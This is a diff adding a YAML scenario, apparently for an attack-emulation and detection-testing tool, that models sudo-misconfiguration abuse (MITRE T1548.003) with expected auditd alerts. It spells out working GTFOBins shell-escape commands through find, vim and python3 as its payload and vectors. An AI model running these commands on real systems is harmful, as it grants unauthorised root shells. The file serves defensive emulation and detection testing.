@@ -1,0 +1,49 @@
+id: privilege_escalation_sudo
+description: >
+  MITRE ATT&CK T1548.003 – Abuse Elevation Control Mechanism: Sudo and Sudo Caching.
+  Emulates enumeration of sudo misconfiguration (NOPASSWD entries) and attempts
+  privilege escalation via a known GTFOBins vector. Runs in emulation mode —
+  no actual privilege change occurs; the agent logs the enumeration path and reports
+  it as a detectable indicator.
+type: privilege_escalation
+
+target:
+  service: local_shell
+  port: null
+  endpoint: null
+
+parameters:
+  username_list:
+    - www-data
+    - backup
+    - deploy
+  password_list: null
+  max_attempts_per_min: 5
+  payload: "sudo -l && sudo find /etc -exec /bin/sh \\; 2>/dev/null"
+
+safety:
+  destructive: false
+  sandbox_required: true
+  allow_payloads: false  # payload is enumeration metadata only; not executed
+
+mitre:
+  tactic: Privilege Escalation
+  technique: T1548
+  sub_technique: T1548.003
+
+gtfobins_vectors:
+  - binary: find
+    command: "sudo find /etc -exec /bin/sh \\;"
+  - binary: vim
+    command: "sudo vim -c ':!sh'"
+  - binary: python3
+    command: "sudo python3 -c 'import os; os.system(\"/bin/sh\")'"
+
+expected_detection:
+  - alert_type: PrivilegeEscalationAttempt
+    source: auditd
+    syscall: execve
+    indicator: "Unexpected sudo usage by low-privilege user"
+  - alert_type: SudoMisconfigurationFound
+    source: phantomnet_agent
+    indicator: "NOPASSWD entry discovered in /etc/sudoers.d/*"
